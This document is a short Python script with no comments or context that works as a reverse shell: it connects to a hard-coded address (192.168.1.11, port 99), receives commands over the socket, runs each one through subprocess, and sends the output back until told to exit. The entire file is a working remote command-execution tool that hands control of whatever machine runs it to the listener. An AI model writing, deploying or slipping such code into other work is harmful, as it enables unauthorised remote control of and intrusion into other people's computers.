import socket
import subprocess

def connect_to_server():
    server_ip = '192.168.1.11'
    server_port = 99

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break

        output = subprocess.getoutput(command)
        client_socket.send(output.encode(errors='ignore'))

    client_socket.close()

if __name__ == "__main__":
    connect_to_server()
